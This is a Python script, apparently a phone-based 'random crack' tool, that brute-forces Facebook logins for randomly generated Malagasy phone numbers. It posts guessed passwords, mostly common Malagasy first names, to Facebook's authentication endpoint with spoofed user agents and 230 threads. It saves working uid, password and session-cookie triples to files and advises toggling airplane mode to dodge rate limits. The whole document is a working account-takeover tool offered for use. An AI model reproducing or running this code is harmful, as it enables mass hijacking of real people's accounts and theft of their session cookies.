#coding: utf-8
#update by :- JANI AMUL❤️ (Mise à jour UA, data et headers d'hier)
#Script Owner : MASTER JANI.MG
#---------------------
try:
    import os, requests, time, re, random, sys, uuid, string, json, subprocess, base64, zlib, hashlib, datetime
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError: 
    os.system('pip install requests > /dev/null')
    exit('\n Run Again ')
    
ugent = []
# Mise à jour de la génération UA pour les anciennes définitions (optionnel)
for z in range(200):
    versi_android = str(random.randint(5, 12)) + ".0.0"
    versi_chrome = str(random.randint(300, 325)) + ".0.0." + str(random.randint(1, 8)) + "." + str(random.randint(40, 150))
    device = random.choice([
        # Modèles Anciens (liste inchangée)
        "CPH1723", "CPH1901", "CPH1920", "CPH1933", "CPH1937", "CPH1945", "CPH1951",
        "CPH1969", "CPH1979", "CPH1983", "CPH2005", "CPH2023", "CPH2083", "CPH2003",
        "CPH2004", "CPH2269", "vivo 1917", "vivo 1915", "vivo 1911", "vivo 1933",
        "vivo 1912", "vivo 1920", "vivo 1921", "vivo 1910", "vivo 1927", "vivo 1913",
        "vivo 1923", "vivo 1926", "vivo 1928", "vivo 1931", "vivo 1935", "SM-G975F",
        "SM-G532G", "SM-N975F", "SM-G988U", "SM-G977U", "SM-A705FN", "SM-A515U1",
        "SM-G955F", "SM-A750G", "SM-N960F", "SM-G960U", "SM-J600F", "SM-A908B",
        "SM-A705GM", "SM-G970U", "SM-A307FN", "SM-G965U1", "SM-A217F", "SM-G986B",
        "SM-A207M", "SM-A515W", "SM-A505G", "SM-A315G", "SM-A507FN", "SM-A505U1",
        "SM-G977T", "SM-A025G", "SM-J320F", "SM-A715W", "SM-A908N", "SM-A205F",
        "SM-G988B", "SM-N986B", "SM-A715F", "SM-A515F", "SM-G965F", "SM-G960F",
        "SM-A505F", "SM-A207F", "SM-A307G", "SM-G970F", "SM-A107F", "SM-G935F",
        "SM-G935A", "SM-A310F", "SM-J320FN", "E6653", "G8231", "C6603", "D6503",
        "SO-05F", "SGP612", "802SO", "J9110", "SOV40", "SO-51A", "XQ-AT51", "SOG01",
        "SO51Aa", "XQ-AT42", "SO-51B", "XQ-BC52", "XQ-BC62", "XQ-BC72", "SOG03",
        "J9150", "I4113", "I3113", "I3123", "901SO", "J3273", "XQ-CC72", "XQ-BT44",
        "SO-41B", "C2304", "E5506", "G3311", "C1905", "D5322", "Pixel C", "Pixel 2",
        "Pixel 2 XL", "Pixel 3a", "Pixel XL", "Pixel Slate", "Google Pixelbook Go",
        # Modèles Intermédiaires et Récents (inchangés)
        "Pixel 4", "Pixel 4 XL", "Pixel 5", "Pixel 6", "Pixel 6 Pro", "Pixel 7 Pro",
        "Pixel 5a", "Pixel 6a", "RMX1831", "RMX1911", "RMX1971", "RMX2030", "RMX2076",
        "RMX2081", "RMX2151", "RMX2176", "RMX2185", "RMX2193", "RMX2194", "RMX2195",
        "RMX3061", "RMX3017", "RMX3042", "RMX1231", "iPhone SE (2022)", "iPhone 12",
        "iPhone 12 Mini", "iPhone 12 Pro", "iPhone 12 Pro Max", "iPhone 13 Mini",
        "iPhone 13", "iPhone 13 Pro", "iPhone 13 Pro Max", "Galaxy S21", "Galaxy S21+",
        "Galaxy S21 Ultra", "Galaxy Note20", "Galaxy Note20 Ultra", "Galaxy A52",
        "Galaxy A72", "Galaxy Z Fold 3", "Galaxy Z Flip 3", "OnePlus 8T", "OnePlus 9R",
        "OnePlus Nord CE 5G", "Oppo Reno 7", "Oppo Reno 7 Pro", "Oppo F21 Pro",
        "Oppo Find X5", "Realme 8 Pro", "Realme 9i", "Realme X7 Pro", "Xperia 1 IV",
        "Xperia 5 IV", "Nokia X20", "Nokia 8.3 5G", "Nokia G10", "ASUS Zenfone 8",
        "ASUS ROG Phone 5", "Honor 50", "Honor V40", "Infinix Zero 8", "Infinix Note 11 Pro",
        "Lenovo Legion Phone Duel 2", "Lenovo K12 Pro", "Mi 11 Ultra", "Mi 11X",
        "Mi 11X Pro", "Redmi Note 11", "Redmi Note 11 Pro",
        # Autres modèles (inchangés)
        "Alcatel 1", "Alcatel 1B", "Alcatel 3X", "Alcatel 1S", "Alcatel 1V", "Alcatel 1C",
        "Alcatel 5V", "Alcatel 7", "Alcatel A5 LED", "Alcatel U5", "Alcatel 1SE", "Alcatel 3L",
        "Alcatel 5", "Alcatel 3V", "Alcatel Idol 4", "Alcatel Idol 5", "Alcatel 1X",
        "Alcatel 1B (2020)", "Alcatel 1S (2020)", "Alcatel 3 (2019)", "Alcatel 3X (2019)",
        "Realme C11", "Realme C12", "Realme C15", "Realme C21", "Realme C25", "Realme C3",
        "Realme Narzo 20", "Realme Narzo 30A", "Realme Narzo 50", "Realme Narzo 50A",
        "Realme 7", "Realme 7 Pro", "Realme 8", "Realme 8i", "Realme 8 Pro", "Realme X50 Pro",
        "Realme X3 SuperZoom", "Realme 9", "Realme 9 Pro+", "Realme GT", "Realme GT Master Edition",
        "Huawei P30", "Huawei P30 Pro", "Huawei P40", "Huawei P40 Pro", "Huawei Mate 20",
        "Huawei Mate 20 Pro", "Huawei Mate 30", "Huawei Mate 30 Pro", "Huawei Mate 40",
        "Huawei Mate 40 Pro", "Huawei Mate X2", "Huawei P50", "Huawei P50 Pro", 
        "Huawei Nova 7", "Huawei Nova 8", "Huawei Nova 9", "Huawei Nova 10", 
        "Huawei Y9 Prime", "Huawei Y7a", "Huawei Y6p", "Huawei Y5p", "Huawei Y8p",
        "Huawei Y9s", "Huawei P Smart", "Huawei P Smart 2021", "Huawei Enjoy 20", 
        "Huawei Enjoy Z", "Huawei Enjoy 10 Plus", "Huawei Y9a", "Huawei MatePad 10.4", 
        "Huawei MatePad Pro", "Huawei MediaPad M5", "Huawei MatePad T10s"
    ])
    # On génère désormais le UA via la fonction mise à jour usert()
    ua = (
        f"Mozilla/5.0 (Linux; Android {versi_android}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{versi_chrome} Mobile Safari/537.36"
    )
    if ua in ugent:
        pass
    else:
        ugent.append(ua)

#---------------------MKING-LOGO---------------------#
logo = '''
                          
       ╔═══╗╔════╗╔═══╗╔╗──╔╗╔═══╗
       ║╔═╗║║╔╗╔╗║║╔══╝║╚╗╔╝║║╔══╝
       ║╚══╗╚╝║║╚╝║╚══╗╚╗║║╔╝║╚══╗
       ╚══╗║──║║──║╔══╝─║╚╝║─║╔══╝
       ║╚═╝║──║║──║╚══╗─╚╗╔╝─║╚══╗
       ╚═══╝──╚╝──╚═══╝──╚╝──╚═══╝
==================================================
'''
loop = 0
oks = []
pcp = []
cps = []
#---------------------MKING-MENU---------------------#
def menu():
    os.system('clear')
    print(logo)
    print('[1] Random Crack ')
    print('[0] Exit Menu')
    print(47*'-')
    opt = input('[?] Choose : ')
    if opt == '1':
        mg_randome()
    elif opt == '0':
        sys.exit()
    else:
        print('\033[1;91m [•] Choose valid option\033[0;97m')
        menu()
        
#---------------------Fonction de génération UA mise à jour---------------------#
# 10 most common models (Samsung Galaxy series) with weights
models = [
    "SM-G960F",  # Galaxy S9
    "SM-G970F",  # Galaxy S10e
    "SM-G973F",  # Galaxy S10
    "SM-G975F",  # Galaxy S10+
    "SM-G980F",  # Galaxy S20
    "SM-G985F",  # Galaxy S20+
    "SM-A520F",  # Galaxy A5 (2017)
    "SM-A530F",  # Galaxy A5 (2018)
    "SM-M205F",  # Galaxy M20
    "SM-J530F"   # Galaxy J5 (2017)
]
weights = [10, 8, 8, 8, 6, 6, 4, 4, 4, 4]

# Map model prefixes to realistic Android versions
android_version_map = {
    "SM-G96": ["10", "11"],
    "SM-G97": ["10", "11", "12"],
    "SM-G98": ["10", "11", "12"],
    "SM-A52": ["7", "8", "9"],
    "SM-A53": ["8", "9", "10"],
    "SM-M20": ["9", "10"],
    "SM-J53": ["7", "8", "9"]
}

def usert():
    # Choose device model with weights
    device_model = random.choices(models, weights=weights, k=1)[0]
    # Pick a realistic Android version for that model
    android_version = next(
        (random.choice(versions) for prefix, versions in android_version_map.items() if device_model.startswith(prefix)),
        str(random.randint(8, 12))
    )
    # Generate Chrome version weighted (Stable/Beta/Dev)
    chrome_versions = [f"{v}.0.{random.randint(7000,7600)}.{random.randint(10,200)}" for v in (135, 136, 137)]
    chrome_version = random.choices(chrome_versions, weights=[70, 20, 10], k=1)[0]
    # Return the full UA string
    return f"Mozilla/5.0 (Linux; Android {android_version}; {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36"

#---------------------MKING-RANDOM_CRACK---------------------#
def mg_randome():
    user = []
    os.system('clear')
    print(logo)
    print('[+] For MG (+26133,+26134,+26132)ETC....')
    print(47*'-')
    kode = input('[?] Input Code : ')
    print(47*'-')
    limit = int(99999)
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=230) as mdp2:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[+] Total Ids : \033[1;92m'+tl)
        print('\033[1;37;1m[$] Brute Has been started...(\033[1;92mUPDATE RANDOM\033[1;97m)')
        print(47*'-')
        print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) EVERY 3 MINUTES')
        print(47*'-')
        for psx in user:
            ids = kode + psx
            passlist = {ids, psx, 'Malalako','Malala','Rakoto','Seheno','Vadiko','Faniry','Volatina','Sitrak','Tolotra','Tsiory','Malagasy','Sitraka','Fanomezana','Sarobidy','Nantenaina','Nomena','Nyaina','Niaina','Hasina','Ravaka','Felana','Mamisoa','Valisoa','Lalaina','Sahaza','Mahefa','Faneva','Tiavina','Santatra','Fitiavana','Tafita','Jesosy','Finoana','Mihary','Mirana','Volamena','Fitahina','Lataka','Fifaliana','Henintsoa','Lahatra','Nirina','Solofo','Tahiry','Volana','Tahina','Tanjona','Harena','Tsilavina','Safidy','Nomenjanahary','Finaritra','Sariaka','Nekena','Tsiaro','Mihaja','Sombiniaina','Miantsa','Hajaina','Fehizoro','Fandresena','Sarika','Salohy'}
            mdp2.submit(rndm, ids, passlist)
        print(47*'\n\033[1;37m-')
        print('[√] Crack process has been completed')
        print('[?] Total Ok Id Save in  /sdcard/MKING-OK.txt')
        print('[?] Total Cp Id Save in  /sdcard/MKING-CP.txt')
        print(47*'-')
        input('Press Enter To Back Menu')

#---------------------START-CRACK---------------------#
def rndm(ids, master_pass):
    global loop
    try:
        session = requests.Session()
        sys.stdout.write('\r\r\033[1;37m [STEVE] %s | \033[1;32mOK:-%s \033[1;37m' % (loop, len(oks)))
        sys.stdout.flush()
        for pas in master_pass:
            # Quelques valeurs aléatoires pour simuler les versions Facebook
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111,999999999))
            # On peut récupérer quelques infos système si besoin (sinon ces lignes peuvent être statiques)
            try:
                android_version = subprocess.check_output('getprop ro.build.version.release', shell=True).decode('utf-8').strip()
                model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').strip()
                build = subprocess.check_output('getprop ro.build.id', shell=True).decode('utf-8').strip()
                fbmf = subprocess.check_output('getprop ro.product.manufacturer', shell=True).decode('utf-8').strip()
                fbbd = subprocess.check_output('getprop ro.product.brand', shell=True).decode('utf-8').strip()
            except Exception:
                android_version = "10"
                model = "Unknown"
                build = "Unknown"
                fbmf = "Unknown"
                fbbd = "Unknown"
            # Mise à jour du payload
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': ids,
                'password': pas,
                'generate_session_cookies': '1',
                'locale': 'fr_FR',
                'client_country_code': 'FR',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            }
            # Mise à jour des headers
            headers = {
                'authority': 'b-graph.facebook.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'no-cache',
                'user-agent': usert(),
                'connection': 'keep-alive',               
                'x-fb-friendly-name': 'authenticate',
                'x-fb-connection-bandwidth': str(random.randint(2000000,3000000)),
                'x-fb-net-hni': str(random.randint(20000,90000)),
                'x-fb-sim-hni': str(random.randint(20000,90000))
            }
            po = session.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers).json()
            if 'session_key' in po:
                uid = po['uid']
                coki = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                print('\r\r\033[1;32m [STEVE-🎉] ' + str(uid) + ' | ' + pas + '\033[1;97m')                
                open('/sdcard/OK-🍪.txt', 'a').write(str(uid) + '|' + pas + '|' + coki + '\n')
                oks.append(str(uid))
                break
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                uid = po['error']['error_data']['uid']
                print('\r\r\x1b[1;33m [STEVE-💔] ' + str(uid) + ' | ' + pas + '\033[1;97m')
                open('/sdcard/CP-💔.txt', 'a').write(str(uid) + '|' + pas + '\n')
                cps.append(str(uid))
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
    except Exception as e:
        pass

menu()
